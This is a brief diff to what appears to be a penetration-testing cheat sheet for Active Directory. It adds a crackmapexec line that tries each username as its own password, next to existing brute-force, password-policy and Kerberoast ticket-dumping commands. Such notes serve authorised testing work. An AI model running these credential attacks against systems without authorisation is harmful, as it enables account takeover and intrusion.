@@ -326,6 +326,8 @@ Get-DomainUser -Identity <AD account> | Get-DomainSPNTicket -Format Hashcat
 ```shell
 # brute forcing, server may block brute-force attack
 sudo crackmapexec <protocol> <target ip> -u <user_list.txt> -p <password_list.txt>
+# testing user = password
+sudo crackmapexec <protocol> <target ip> -u <user_list.txt> -p <user_list.txt> --no-bruteforce
 # check password policy
 sudo crackmapexec <protocol> <target ip> --pass-pol
 # using existing credentials and users to find more credentials 
